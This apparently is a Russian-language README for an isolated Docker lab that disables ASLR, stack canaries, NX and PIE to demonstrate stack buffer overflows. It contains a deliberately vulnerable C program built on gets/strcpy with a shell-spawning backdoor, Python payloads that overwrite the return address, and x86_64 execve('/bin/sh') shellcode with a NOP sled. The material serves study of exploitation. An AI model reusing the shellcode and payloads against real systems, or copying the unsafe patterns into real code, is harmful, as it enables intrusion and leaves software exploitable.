# SentinelX Docker Environment - x86_64 Exploitation Lab

Полноценная лаборатория для тестирования эксплойтов на x86_64 архитектуре без защит.

## Что это?

Docker окружение с Ubuntu 22.04 x86_64, где:
- ✅ Отключен ASLR (рандомизация адресов)
- ✅ Скомпилированы бинарники без защит
- ✅ Исполняемый стек (execstack)
- ✅ Нет PIE (Position Independent Executable)
- ✅ Нет stack canary

Это позволяет продемонстрировать **полную эксплуатацию** buffer overflow с выполнением shellcode.

## Быстрый старт

### 1. Сборка и запуск контейнера

```bash
# Из корневой директории проекта
cd docker

# Собрать образ и запустить контейнер
docker-compose up -d --build

# Войти в контейнер
docker-compose exec sentinelx /bin/bash

# Или альтернативно через docker
docker build -t sentinelx -f docker/Dockerfile .
docker run -it --privileged --security-opt seccomp=unconfined sentinelx
```

### 2. Автоматическая сборка и тестирование

Внутри контейнера:

```bash
# Запустить автоматический скрипт
bash docker/build_and_test.sh
```

Этот скрипт:
1. Отключает ASLR
2. Компилирует уязвимую программу (x86_64 и x86)
3. Проверяет защиты бинарника
4. Собирает SentinelX
5. Анализирует уязвимость
6. Генерирует эксплойты
7. Тестирует переполнение
8. Запускает тестовый эксплойт

### 3. Ручное тестирование

```bash
# Компилируем уязвимую программу
cd docker
gcc -m64 -fno-stack-protector -z execstack -no-pie \
    -Wno-deprecated-declarations \
    vuln_program.c -o vuln64

# Проверяем защиты
file vuln64
readelf -l vuln64 | grep GNU_STACK

# Тестируем нормальную работу
echo "admin" | ./vuln64

# Тестируем переполнение
python3 -c "print('A'*100)" | ./vuln64
# Program should crash

# Анализируем через SentinelX
../build/SentinelX --binary vuln64

# Генерируем эксплойты
../build/SentinelX --binary vuln64 \
    --generate-exploits \
    --exploit-format both \
    --exploit-output exploits_x64
```

## Уязвимая программа

### vuln_program.c

Имитация системы аутентификации с двумя уязвимостями:

#### 1. Gets() в read_username()
```c
int read_username(char *username) {
    printf("Username: ");
    gets(username);  // УЯЗВИМО! Нет ограничения длины
    return strlen(username);
}
```

#### 2. Strcpy() в check_password()
```c
int check_password(const char *input) {
    char buffer[32];
    strcpy(buffer, input);  // УЯЗВИМО! Может переполнить
    ...
}
```

#### 3. Secret backdoor функция
```c
void secret_backdoor() {
    printf("SECRET BACKDOOR ACTIVATED!\n");
    system("/bin/sh");  // Запускает shell
}
```

Эта функция никогда не вызывается нормально, но мы можем перенаправить выполнение на неё через buffer overflow!

## Структура эксплойта x86_64

### Stack Layout

```
┌─────────────────────┐ <- High addresses
│  Return Address     │  8 bytes (target address)
├─────────────────────┤
│  Saved RBP          │  8 bytes
├─────────────────────┤
│  username[64]       │  64 bytes (buffer)
└─────────────────────┘ <- Low addresses
```

### Payload Structure

```
[username buffer] + [saved RBP] + [return address]
    64 bytes    +    8 bytes   +    8 bytes
      (A's)     +     (B's)    + (backdoor addr)
```

### Offsets

- **Buffer size**: 64 bytes
- **To saved RBP**: 64 bytes
- **To return address**: 72 bytes (64 + 8)

## Пример эксплуатации

### Метод 1: Перенаправление на secret_backdoor()

```python
import struct
import subprocess

# Получаем адрес secret_backdoor
# nm vuln64 | grep secret_backdoor
backdoor = 0x401234  # Пример адреса

# Создаем payload
payload = b"A" * 64        # Заполняем username buffer
payload += b"B" * 8        # Перезаписываем saved RBP
payload += struct.pack("<Q", backdoor)  # Return address

# Отправляем
proc = subprocess.Popen(['./vuln64'], stdin=subprocess.PIPE)
proc.communicate(input=payload)
```

### Метод 2: Shellcode execution

```python
# x86_64 shellcode для execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xd2"              # xor rdx, rdx
shellcode += b"\x48\x31\xf6"             # xor rsi, rsi
shellcode += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rbx, '/bin/sh'
shellcode += b"\x53"                     # push rbx
shellcode += b"\x54"                     # push rsp
shellcode += b"\x5f"                     # pop rdi
shellcode += b"\xb0\x3b"                 # mov al, 59
shellcode += b"\x0f\x05"                 # syscall

# NOP sled для увеличения шансов попадания
nops = b"\x90" * 20

# Payload
payload = nops + shellcode
payload += b"A" * (64 - len(payload))
payload += b"B" * 8
# Return address указывает в середину NOP sled
payload += struct.pack("<Q", stack_addr)
```

## Анализ через SentinelX

### Обнаруженные уязвимости

```bash
../build/SentinelX --binary vuln64
```

**Вывод:**
```
[WARNING][MEDIUM] BIN_UNSAFE_CALL_gets
  arch: x86_64, section: .text
  offset: 0x401245, function: read_username

  Call to potentially unsafe function 'gets' at address 0x401245.
  Recommendation: Replace with fgets() or scanf() with width limit.

[WARNING][MEDIUM] BIN_UNSAFE_CALL_strcpy
  arch: x86_64, section: .text
  offset: 0x401289, function: check_password

  Call to potentially unsafe function 'strcpy' at address 0x401289.
  Recommendation: Replace with strncpy() or strlcpy().
```

### Сгенерированные эксплойты

```bash
../build/SentinelX --binary vuln64 --generate-exploits
```

Создаёт:
- `exploit_BIN_UNSAFE_CALL_gets_read_username.py`
- `exploit_BIN_UNSAFE_CALL_gets_read_username.c`
- `exploit_BIN_UNSAFE_CALL_strcpy_check_password.py`
- `exploit_BIN_UNSAFE_CALL_strcpy_check_password.c`

## Тестирование эксплойта

### Автоматический тест

```bash
python3 docker/test_exploit.py
```

**Ожидаемый результат:**
```
[+] Found secret_backdoor at: 0x401196
[*] Payload length: 80 bytes
[*] Launching exploit...

╔════════════════════════════════════════╗
║   🔓 SECRET BACKDOOR ACTIVATED! 🔓   ║
╚════════════════════════════════════════╝

[*] Spawning shell...
$ whoami
root
$
```

### GDB Debugging

```bash
# Запускаем в GDB
gdb ./vuln64

# Устанавливаем breakpoint на read_username
(gdb) break read_username
(gdb) run

# Проверяем layout стека
(gdb) info frame
(gdb) x/20x $rsp

# Отправляем payload
(gdb) run < <(python3 -c "print('A'*80)")

# Проверяем RIP
(gdb) info registers rip
```

## Отключение защит

### В контейнере (автоматически)

```bash
# Проверяем ASLR
cat /proc/sys/kernel/randomize_va_space
# Должно быть 0 (отключен)

# Если не отключен:
echo 0 > /proc/sys/kernel/randomize_va_space
```

### Флаги компиляции

```bash
gcc -m64 \
    -fno-stack-protector \    # Отключить stack canary
    -z execstack \             # Разрешить исполнение на стеке
    -no-pie \                  # Отключить PIE
    -Wno-deprecated-declarations \
    vuln_program.c -o vuln64
```

## Troubleshooting

### ASLR не отключается

Контейнер должен быть запущен с `--privileged`:
```bash
docker run -it --privileged sentinelx
```

### Программа падает но shell не запускается

1. Проверьте адрес secret_backdoor:
   ```bash
   nm vuln64 | grep secret_backdoor
   ```

2. Убедитесь что ASLR отключен:
   ```bash
   cat /proc/sys/kernel/randomize_va_space  # Должно быть 0
   ```

3. Проверьте offset:
   ```bash
   gdb vuln64
   (gdb) run < <(python3 -c "print('A'*100)")
   (gdb) info registers rip
   # Смотрим куда указывает RIP
   ```

### Shellcode не выполняется

1. Проверьте что стек исполняемый:
   ```bash
   readelf -l vuln64 | grep GNU_STACK
   # Должно быть: RWE (read-write-execute)
   ```

2. Убедитесь что адрес указывает на shellcode:
   ```bash
   # В GDB проверьте куда указывает return address
   ```

## Сравнение: macOS vs Docker Ubuntu

| Защита | macOS | Docker Ubuntu |
|--------|-------|---------------|
| Stack Canary | ✅ Включен | ❌ Отключен (-fno-stack-protector) |
| NX/DEP | ✅ Включен | ❌ Отключен (-z execstack) |
| ASLR | ✅ Включен | ❌ Отключен (echo 0 > /proc/sys/..) |
| PIE | ✅ Включен | ❌ Отключен (-no-pie) |
| Code Signing | ✅ Включен | ❌ Нет на Linux |

**Результат:**
- macOS: Эксплойт вызывает crash, но не получает контроль
- Docker: **Полная эксплуатация** с выполнением shellcode

## Архитектурные различия

### ARM64 (macOS) vs x86_64 (Docker)

| Aspect | ARM64 | x86_64 |
|--------|-------|--------|
| Регистры | x0-x30 | rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp |
| Вызов функций | x0-x7 для аргументов | rdi, rsi, rdx, rcx, r8, r9 |
| Размер указателя | 8 bytes | 8 bytes |
| Alignment | 16 bytes | 16 bytes |
| Shellcode | ARM64 инструкции | x86_64 инструкции |
| Syscall | svc #0 | syscall |

## Заключение

Docker окружение предоставляет:
- ✅ Реалистичную среду для тестирования
- ✅ Полную эксплуатацию без ограничений защит
- ✅ x86_64 архитектуру (стандарт в индустрии)
- ✅ Изолированность (безопасно экспериментировать)
- ✅ Воспроизводимость результатов

Это идеальная лаборатория для изучения эксплуатации уязвимостей!

## Дополнительные команды

```bash
# Просмотр символов
nm vuln64

# Дизассемблирование
objdump -d vuln64 | less

# Strings в бинарнике
strings vuln64

# Проверка security features
checksec --file=vuln64  # Если установлен

# Трассировка системных вызовов
strace ./vuln64

# Трассировка библиотечных вызовов
ltrace ./vuln64
```

## Полезные ресурсы

- [Shellcode database](http://shell-storm.org/shellcode/)
- [pwntools documentation](https://docs.pwntools.com/)
- [Linux syscalls x86_64](https://filippo.io/linux-syscall-table/)
- [Buffer Overflow tutorial](https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf)
